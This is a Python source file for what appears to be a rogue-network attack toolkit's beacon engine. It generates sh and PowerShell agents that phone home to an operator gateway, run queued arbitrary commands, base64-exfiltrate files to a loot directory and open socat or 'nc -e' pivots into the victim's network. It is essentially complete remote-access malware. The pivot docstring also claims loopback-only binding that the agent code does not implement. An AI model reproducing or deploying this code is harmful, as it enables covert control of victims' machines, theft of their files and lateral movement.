"""Beacon / sessions engine: agent payloads, session registry, command queue.

The operator toggles a beacon on from the Sessions tab; the dashboard then
shows copy-able agent payloads (POSIX sh + PowerShell). A victim that runs the
agent phones home on the rogue subnet, registers as a session, and pulls
operator commands from a queue. The kill switch is tripped the moment the
machinery is stopped — sessions keep phoning but receive no more tasks.
"""

import base64
import hashlib
import os
import re
import threading
import time

from . import config
from . import state

FILE_MARKER = '@@FILE::'
LS_MARKER = '@@LS::'
FW_MARKER = '@@FW::'
BEACON_DIR = os.path.join(config.LOOT_DIR, 'beacon')
TERM_ROLL = 200                       # interactive terminal buffer per session


def _gw():
    ip = config.PORTAL_IP
    return ip if config.PORTAL_PORT == 80 else '%s:%d' % (ip, config.PORTAL_PORT)


def _maxout():
    try:
        return max(4096, min(int(state.read_settings().get('beacon_maxout')
                                 or config.BEACON_MAXOUT), 16 * 1024 * 1024))
    except (TypeError, ValueError):
        return config.BEACON_MAXOUT


# GNU `ls -la` line: drwxr-xr-x  2 root root 4096 Sep 15 12:00 name [-> target]
_LS_LINE_RE = re.compile(
    r'^(?P<perm>[dl-][rwxstS-]{9})(?:\+)?\s+\d+\s+\S+\s+\S+\s+'
    r'(?P<size>\d+)\s+(?P<date>\S+\s+\d+\s+\d+:\d+)\s+(?P<name>.+?)$')


def parse_ls(listing):
    """Parse a GNU `ls -la` dump into [{name,size,dir,link}] (lenient).

    Returns an empty list when the listing is not GNU-shaped (e.g. Windows
    Get-ChildItem), so the dashboard falls back to showing the raw text.
    `.`/`..` are dropped.
    """
    entries = []
    for line in (listing or '').split('\n'):
        m = _LS_LINE_RE.match(line.rstrip())
        if not m:
            continue
        name = m.group('name')
        if name in ('.', '..'):
            continue
        link = ''
        if ' -> ' in name:
            name, link = name.split(' -> ', 1)
        entries.append({
            'name': name,
            'size': int(m.group('size')),
            'dir': m.group('perm')[0] == 'd' or name.endswith('/'),
            'link': link,
        })
    return entries


def _payload_sh():
    return (r"""#!/bin/sh
# MALSTROM beacon — authorized engagements only
GW="http://__GATEWAY__"
KEY="__KEY__"
INT=__INTERVAL__
SID=""
R=""
HOST=$(uname -n 2>/dev/null)
OS=$(uname -s -r 2>/dev/null)
USR=$(id -un 2>/dev/null || printf '%s' "$USER")
post(){ curl -s -m 15 -X POST "$@"; }
reg(){ post --data-urlencode "k=$KEY" --data-urlencode "host=$HOST" \
    --data-urlencode "os=$OS" --data-urlencode "user=$USR" "$GW/beacon/reg"; }
put(){ post --data-urlencode "k=$KEY" --data-urlencode "sid=$SID" \
    --data-urlencode "id=$ID" --data-urlencode "out=$O" "$GW/beacon/out" >/dev/null 2>&1; }
while :; do
  R=$(reg)
  SID=$(printf '%s\n' "$R" | sed -n 's/^SID=//p')
  printf '%s\n' "$R" | sed -n 's/^TASK|//p' | \
  while IFS='|' read -r ID CMD; do
    if [ -n "$ID" ] && [ -n "$CMD" ]; then
      case "$CMD" in
        @@FILE::*)
          F="${CMD#@@FILE::}"
          if [ -r "$F" ]; then O=$(base64 "$F" 2>/dev/null | tr -d '\r\n'); else O="ERR no such file or unreadable: $F"; fi ;;
        @@LS::*)
          O=$(ls -la "${CMD#@@LS::}" 2>&1) ;;
        @@FW::*)
          S="${CMD#@@FW::}"; LP="${S%%-*}"; T="${S#*-}"
          ( nohup socat TCP-LISTEN:$LP,fork,reuseaddr TCP:$T >/dev/null 2>&1 & ) \
            || ( nohup sh -c "nc -l -p $LP -e nc $T" >/dev/null 2>&1 & )
          O="pivot armed: $LP -> $T" ;;
        *)
          O=$(sh -c "$CMD" 2>&1) ;;
      esac
      put
    fi
  done
  sleep $INT
done
""").replace('__GATEWAY__', _gw())


def _payload_ps1():
    return (r"""# MALSTROM beacon — authorized engagements only
$GW  = "http://__GATEWAY__"
$KEY = "__KEY__"
$INT = __INTERVAL__
$env:_MS_SID = ""
function Post($path, $fields) {
  $body = "k=$KEY"
  foreach ($f in $fields.GetEnumerator()) {
    $body += "&" + [uri]::EscapeDataString($f.Name) + "=" + [uri]::EscapeDataString($f.Value)
  }
  try { return Invoke-WebRequest -UseBasicParsing -Method POST -Body $body -Uri "$GW/beacon/$path" }
  catch { return $null }
}
while ($true) {
  $r = Post "reg" @{host=$env:COMPUTERNAME; user=$env:USERNAME; os=$((Get-CimInstance Win32_OperatingSystem).Caption)}
  if ($r -ne $null) {
    foreach ($l in ($r.Content -split "`n")) {
      if ($l -like "SID=*") { $env:_MS_SID = $l.Substring(4).Trim() }
      elseif ($l -like "TASK|*") {
        $p = $l.Substring(5) -split "\|",2
        if ($p[1] -like "@@FILE::*") {
          $f = $p[1].Substring(8)
          try { $o = [Convert]::ToBase64String([IO.File]::ReadAllBytes($f)) }
          catch { $o = "ERR $f ($($_.Exception.Message))" }
        } elseif ($p[1] -like "@@LS::*") {
          try { $o = (Get-ChildItem -Force $p[1].Substring(6) 2>&1 | Out-String) }
          catch { $o = "ERR $($_.Exception.Message)" }
        } elseif ($p[1] -like "@@FW::*") {
          $o = "pivot: Windows forward not supported yet (use the unix agent)"
        } else { $o = (& cmd /c $p[1] 2>&1 | Out-String) }
        [void](Post "out" @{sid=$env:_MS_SID; id=$p[0]; out=$o})
      }
    }
  }
  Start-Sleep -Seconds $INT
}
""").replace('__GATEWAY__', _gw())


CTL_FILE = os.path.join(config.STATE_DIR, 'beacon.enabled')


class BeaconEngine(object):
    def __init__(self):
        self._lock = threading.Lock()
        self._on = self._read_ctl()
        self._task_seq = int(time.time() * 1000)

    # --- toggle -----------------------------------------------------------------
    def _read_ctl(self):
        try:
            with open(CTL_FILE) as fh:
                return fh.read().strip() == '1'
        except IOError:
            return False

    def _write_ctl(self, on):
        try:
            with open(CTL_FILE, 'w') as fh:
                fh.write('1' if on else '0')
        except IOError:
            pass

    def enabled(self):
        with self._lock:
            try:
                with open(CTL_FILE) as fh:
                    return fh.read().strip() == '1'
            except IOError:
                return False

    def set_enabled(self, on):
        on = bool(on)
        with self._lock:
            changed = on != self._on
            self._on = on
            self._write_ctl(on)
        if changed:
            state.emit('MITM', 'beacon %s (%s)' % (
                'armed' if on else 'disarmed', 'sessions keep phoning' if not on else ''))
        return {'ok': 1, 'on': on, 'key': state.get_beacon_key()}

    def payload(self, kind):
        key = state.get_beacon_key()
        interval = int(state.read_settings().get('beacon_interval')
                       or config.BEACON_INTERVAL)
        if kind == 'sh':
            return _payload_sh().replace('__KEY__', key).replace(
                '__INTERVAL__', str(interval))
        if kind == 'ps1':
            return _payload_ps1().replace('__KEY__', key).replace(
                '__INTERVAL__', str(interval))
        return ''

    # --- sessions ----------------------------------------------------------------
    def _sessions(self):
        return state.read_beacons()

    def register(self, ip, host, os_, user, k):
        if not self.enabled():
            return None
        if k != state.get_beacon_key():
            return None
        sessions = self._sessions()
        now = time.strftime('%Y-%m-%d %H:%M:%S UTC')
        for s in sessions.values():
            if s.get('ip') == ip and s.get('host') == host:
                s['last_seen'] = now
                if user:
                    s['user'] = user
                if os_:
                    s['os'] = os_
                state.write_beacons(sessions)
                return s['id'], self._collect(s)
        sid = os.urandom(4).hex()
        sessions[sid] = {
            'id': sid, 'ip': ip, 'host': host or '', 'os': os_ or '',
            'user': user or '', 'first_seen': now, 'last_seen': now,
            'tasks': [], 'out': [], 'term': [], 'term_on': False,
        }
        state.write_beacons(sessions)
        state.emit('SESS', 'session registered: %s @ %s (%s %s)' % (
            host or '?', ip, os_ or '?', user or '?'))
        return sid, self._collect(sessions[sid])

    def _collect(self, session):
        tasks = []
        for t in session.get('tasks', []):
            if t.get('status') == 'pending':
                tasks.append(t)
        return tasks

    def task_output(self, sid, task_id, out):
        sessions = self._sessions()
        s = sessions.get(sid)
        if not s:
            return
        maxout = _maxout()
        for t in s.get('tasks', []):
            if str(t.get('id')) == str(task_id):
                t['status'] = 'done'
                text = out[:maxout]
                if t.get('kind') == 'file':
                    text = self._save_file(sid, task_id, t, out) or text
                elif t.get('kind') == 'ls':
                    entries = parse_ls(text)
                    if entries:
                        t['entries'] = entries
                t['out'] = text
                s['out'] = s.get('out', [])[-20:]
                entry = {'ts': time.strftime('%Y-%m-%d %H:%M:%S UTC'),
                         'task': task_id, 'cmd': t.get('cmd', ''), 'out': text}
                if t.get('file'):
                    entry['file'] = t['file']
                if t.get('path'):
                    entry['path'] = t['path']
                s['out'].append(entry)
                if t.get('kind') == 'term':
                    term = s.setdefault('term', [])
                    term.append({'ts': entry['ts'],
                                 'cmd': t.get('cmd', ''), 'out': text})
                    del term[:-TERM_ROLL]
                s['last_seen'] = time.strftime('%Y-%m-%d %H:%M:%S UTC')
        state.write_beacons(sessions)

    def _save_file(self, sid, task_id, task, out):
        raw = (out or '').strip()
        if raw.startswith('ERR ') or not raw:
            return raw or 'ERR empty payload'
        try:
            data = base64.b64decode(raw, validate=True)
        except Exception:
            return 'ERR corrupt base64 payload'
        base = os.path.basename((task.get('path') or '').replace('\\', '/') or 'file')
        safe = re.sub(r'[^A-Za-z0-9._-]', '_', base) or 'file'
        name = '%s_%s_%s' % (sid, task_id, safe)
        try:
            os.makedirs(BEACON_DIR, exist_ok=True)
            with open(os.path.join(BEACON_DIR, name), 'wb') as fh:
                fh.write(data)
        except OSError as exc:
            return 'ERR save failed: %s' % exc
        sha = hashlib.sha256(data).hexdigest()[:10]
        task['file'] = 'beacon/' + name
        return 'saved -> beacon/%s (%d bytes) sha256 %s' % (
            name, len(data), sha)

    def add_command(self, sid, cmd, emit=True, kind='cmd'):
        cmd = (cmd or '').strip()
        if not cmd:
            return {'ok': 0, 'error': 'command required'}
        sessions = self._sessions()
        s = sessions.get(sid)
        if not s:
            return {'ok': 0, 'error': 'no such session'}
        marker, task_cmd = cmd, cmd
        task = {'id': self._next_task(), 'status': 'pending', 'kind': kind,
                'ts': time.strftime('%Y-%m-%d %H:%M:%S UTC')}
        if kind == 'ls':
            task_cmd = LS_MARKER + cmd
            task['browse'] = cmd
        elif kind == 'fw':
            spec = self._check_fw(cmd)
            if not spec:
                return {'ok': 0, 'error': 'expected <lport>-<host>:<port>'}
            lport, thost, tport = spec
            task_cmd = FW_MARKER + '%d-%s:%d' % (lport, thost, tport)
            task['persistent'] = True
            task['fw'] = '%d -> %s:%d' % (lport, thost, tport)
        task['cmd'] = task_cmd
        if kind == 'file':
            task['path'] = cmd
        s.setdefault('tasks', []).append(task)
        state.write_beacons(sessions)
        if emit:
            desc = task.get('fw') or task.get('browse') or task.get('path') or cmd
            state.emit('MITM', 'beacon %s queued -> %s (%s)' % (
                kind.upper(), host_label(s), desc))
        return {'ok': 1, 'id': task['id'], 'kind': kind}

    def _next_task(self):
        with self._lock:
            self._task_seq += 1
            return self._task_seq % 1000000007

    @staticmethod
    def _check_fw(spec):
        """Validate a pivot spec `LPORT-HOST:PORT`; returns a parsed tuple
        or None. Binds only to a loopback listener on the victim by default:
        the forward is a *gateway into the victim's network*, and exposing it
        on the victim's main interface would also expose it to every subnet
        neighbour, not just the operator."""
        m = re.match(r'^(\d{1,5})-(.+):(\d{1,5})$', (spec or '').strip())
        if not m:
            return None
        lport = int(m.group(1))
        tport = int(m.group(3))
        if not 1 <= lport <= 65535 or not 1 <= tport <= 65535:
            return None
        thost = m.group(2).strip()
        if not re.fullmatch(r'[A-Za-z0-9.-]+', thost):
            return None
        return lport, thost, tport

    def add_ls(self, sid, path, emit=True):
        if not (path or '').strip():
            return {'ok': 0, 'error': 'path required'}
        return self.add_command(sid, path.strip(), emit=emit, kind='ls')

    def add_fwd(self, sid, spec, emit=True):
        return self.add_command(sid, spec, emit=emit, kind='fw')

    def set_term(self, sid, on):
        sessions = self._sessions()
        s = sessions.get(sid)
        if not s:
            return {'ok': 0, 'error': 'no such session'}
        s['term_on'] = bool(on)
        state.write_beacons(sessions)
        state.emit('MITM', 'beacon terminal %s for %s (%s)' % (
            ('on' if on else 'off'), host_label(s),
            s.get('os') or s.get('ip') or '?'))
        return {'ok': 1, 'on': bool(on)}

    def add_file(self, sid, path, emit=True):
        if not path.strip():
            return {'ok': 0, 'error': 'path required'}
        return self.add_command(sid, FILE_MARKER + path.strip(), emit=emit,
                                kind='file')

    def mark_sent(self, sid, task_id):
        sessions = self._sessions()
        s = sessions.get(sid)
        if not s:
            return
        for t in s.get('tasks', []):
            if str(t.get('id')) == str(task_id):
                t['status'] = 'sent'
        state.write_beacons(sessions)


def host_label(s):
    return s.get('host') or s.get('ip') or '?'